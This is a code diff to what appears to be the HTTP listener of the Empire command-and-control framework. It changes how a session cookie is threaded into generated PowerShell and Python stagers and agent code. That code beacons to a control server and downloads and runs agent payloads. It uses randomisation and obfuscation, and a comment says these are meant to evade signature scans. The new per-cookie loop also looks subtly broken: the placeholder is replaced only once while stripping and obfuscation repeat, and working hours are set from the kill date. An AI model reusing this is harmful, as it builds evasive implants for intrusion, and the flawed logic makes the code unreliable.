@@ -9,6 +9,7 @@ import time
 import copy
 import json
 import sys
+import magic
 from pydispatch import dispatcher
 from flask import Flask, request, make_response, send_from_directory
 # Empire imports
@@ -106,7 +107,7 @@ class Listener:
                 'Description'   :   'Hours for the agent to operate (09:00-17:00).',
                 'Required'      :   False,
                 'Value'         :   ''
-            },         
+            },          
             'Headers' : {
                 'Description'   :   'Headers for the control server.',
                 'Required'      :   True,
@@ -163,10 +164,9 @@ class Listener:
         # randomize the length of the default_response and index_page headers to evade signature based scans
         self.header_offset = random.randint(0, 64)
 
-        self.session_cookie = ''      
         if self.options['Cookie']['Value'] == '':
             self.options['Cookie']['Value'] = self.generate_cookie()
-
+              
 
     def default_response(self):
         """
@@ -280,8 +280,7 @@ class Listener:
             uris = [a for a in profile.split('|')[0].split(',')]
             stage0 = random.choice(uris)
             customHeaders = profile.split('|')[2:]
-
-            self.session_cookie = listenerOptions['Cookie']['Value']  
+            cookie  = listenerOptions['Cookie']['Value']
 
             if language.startswith('po'):
                 # PowerShell
@@ -407,7 +406,7 @@ class Listener:
 
                 # add the RC4 packet to a cookie
                 stager += helpers.randomize_capitalization("$"+helpers.generate_random_script_var_name("wc")+".Headers.Add(")
-                stager += "\"Cookie\",\"%s=%s\");" % (self.session_cookie, b64RoutingPacket)
+                stager += "\"Cookie\",\"%s=%s\");" % (cookie, b64RoutingPacket)
                 
                 stager += helpers.randomize_capitalization("$data=$"+helpers.generate_random_script_var_name("wc")+".DownloadData($ser+$t);")
                 stager += helpers.randomize_capitalization("$iv=$data[0..3];$data=$data[4..$data.length];")
@@ -460,7 +459,7 @@ class Listener:
                 launcherBase += "req=urllib2.Request(server+t);\n"
                 # add the RC4 packet to a cookie
                 launcherBase += "req.add_header('User-Agent',UA);\n"
-                launcherBase += "req.add_header('Cookie',\"%s=%s\");\n" % (self.session_cookie,b64RoutingPacket)
+                launcherBase += "req.add_header('Cookie',\"%s=%s\");\n" % (cookie,b64RoutingPacket)
 
                 # Add custom headers if any
                 if customHeaders != []:
@@ -664,25 +663,29 @@ class Listener:
             code = f.read()
             f.close()
 
-            # patch in the comms methods
-            commsCode = self.generate_comms(listenerOptions=listenerOptions, language=language)
-            code = code.replace('REPLACE_COMMS', commsCode)
+            cookies = helpers.get_listener_cookies()
 
-            # strip out comments and blank lines
-            code = helpers.strip_powershell_comments(code)
+            for cookie in cookies:
+                # patch in the comms methods
+                commsCode = self.generate_comms(listenerOptions=listenerOptions, language=language, cookie=cookie)
+                code = code.replace('REPLACE_COMMS', commsCode)
 
-            # patch in the delay, jitter, lost limit, and comms profile
-            code = code.replace('$AgentDelay = 60', "$AgentDelay = " + str(delay))
-            code = code.replace('$AgentJitter = 0', "$AgentJitter = " + str(jitter))
-            code = code.replace('$Profile = "/admin/get.php,/news.php,/login/process.php|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"', "$Profile = \"" + str(profile) + "\"")
-            code = code.replace('$LostLimit = 60', "$LostLimit = " + str(lostLimit))
-            code = code.replace('$DefaultResponse = ""', '$DefaultResponse = "'+str(b64DefaultResponse)+'"')
+                # strip out comments and blank lines
+                code = helpers.strip_powershell_comments(code)
 
-            # patch in the killDate and workingHours if they're specified
-            if killDate != "":
-                code = code.replace('$KillDate,', "$KillDate = '" + str(killDate) + "',")
-            if obfuscate:
-                code = helpers.obfuscate(self.mainMenu.installPath, code, obfuscationCommand=obfuscationCommand)
+                # patch in the delay, jitter, lost limit, and comms profile
+                code = code.replace('$AgentDelay = 60', "$AgentDelay = " + str(delay))
+                code = code.replace('$AgentJitter = 0', "$AgentJitter = " + str(jitter))
+                code = code.replace('$Profile = "/admin/get.php,/news.php,/login/process.php|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"', "$Profile = \"" + str(profile) + "\"")
+                code = code.replace('$LostLimit = 60', "$LostLimit = " + str(lostLimit))
+                code = code.replace('$DefaultResponse = ""', '$DefaultResponse = "'+str(b64DefaultResponse)+'"')
+
+                # patch in the killDate and workingHours if they're specified
+                if killDate != "":
+                    code = code.replace('$KillDate,', "$KillDate = '" + str(killDate) + "',")
+                if obfuscate:
+                    code = helpers.obfuscate(self.mainMenu.installPath, code, obfuscationCommand=obfuscationCommand)
+            
             return code
 
         elif language == 'python':
@@ -690,32 +693,35 @@ class Listener:
             code = f.read()
             f.close()
 
-            # patch in the comms methods
-            commsCode = self.generate_comms(listenerOptions=listenerOptions, language=language)
-            code = code.replace('REPLACE_COMMS', commsCode)
+            cookies = helpers.get_listener_cookies()
 
-            # strip out comments and blank lines
-            code = helpers.strip_python_comments(code)
+            for cookie in cookies:
+                # patch in the comms methods
+                commsCode = self.generate_comms(listenerOptions=listenerOptions, language=language, cookie=cookie)
+                code = code.replace('REPLACE_COMMS', commsCode)
 
-            # patch in the delay, jitter, lost limit, and comms profile
-            code = code.replace('delay = 60', 'delay = %s' % (delay))
-            code = code.replace('jitter = 0.0', 'jitter = %s' % (jitter))
-            code = code.replace('profile = "/admin/get.php,/news.php,/login/process.php|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"', 'profile = "%s"' % (profile))
-            code = code.replace('lostLimit = 60', 'lostLimit = %s' % (lostLimit))
-            code = code.replace('defaultResponse = base64.b64decode("")', 'defaultResponse = base64.b64decode("%s")' % (b64DefaultResponse))
+                # strip out comments and blank lines
+                code = helpers.strip_python_comments(code)
 
-            # patch in the killDate and workingHours if they're specified
-            if killDate != "":
-                code = code.replace('killDate = ""', 'killDate = "%s"' % (killDate))
-            if workingHours != "":
-                code = code.replace('workingHours = ""', 'workingHours = "%s"' % (killDate))
+                # patch in the delay, jitter, lost limit, and comms profile
+                code = code.replace('delay = 60', 'delay = %s' % (delay))
+                code = code.replace('jitter = 0.0', 'jitter = %s' % (jitter))
+                code = code.replace('profile = "/admin/get.php,/news.php,/login/process.php|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"', 'profile = "%s"' % (profile))
+                code = code.replace('lostLimit = 60', 'lostLimit = %s' % (lostLimit))
+                code = code.replace('defaultResponse = base64.b64decode("")', 'defaultResponse = base64.b64decode("%s")' % (b64DefaultResponse))
+
+                # patch in the killDate and workingHours if they're specified
+                if killDate != "":
+                    code = code.replace('killDate = ""', 'killDate = "%s"' % (killDate))
+                if workingHours != "":
+                    code = code.replace('workingHours = ""', 'workingHours = "%s"' % (killDate))
 
             return code
         else:
             print helpers.color("[!] listeners/http generate_agent(): invalid language specification, only 'powershell' and 'python' are currently supported for this module.")
 
 
-    def generate_comms(self, listenerOptions, language=None):
+    def generate_comms(self, listenerOptions, language=None, cookie=''):
         """
         Generate just the agent communication code block needed for communications with this listener.
 
@@ -755,7 +761,7 @@ class Listener:
 
                                 $"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add("User-Agent",$script:UserAgent)
                                 $script:Headers.GetEnumerator() | % {$"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add($_.Name, $_.Value)}
-                                $"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add("Cookie",\"""" + self.session_cookie + """=$RoutingCookie")
+                                $"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add("Cookie",\"""" + cookie + """=$RoutingCookie")
 
                                 # choose a random valid URI for checkin
                                 $taskURI = $script:TaskURIs | Get-Random
@@ -847,7 +853,7 @@ def send_message(packets=None):
         #   meta TASKING_REQUEST = 4
         routingPacket = build_routing_packet(stagingKey, sessionID, meta=4)
         b64routingPacket = base64.b64encode(routingPacket)
-        headers['Cookie'] = \"""" + self.session_cookie + """=%s" % (b64routingPacket)
+        headers['Cookie'] = \"""" + cookie + """=%s" % (b64routingPacket)
 
     taskURI = random.sample(taskURIs, 1)[0]
     requestUri = server + taskURI
@@ -1015,7 +1021,7 @@ def send_message(packets=None):
                                     routingPacket = base64.b64decode(base64RoutingPacket)
                 except Exception as e:
                     routingPacket = None
-                    pass 
+                    pass
 
             if routingPacket:
                 # parse the routing packet and process the results
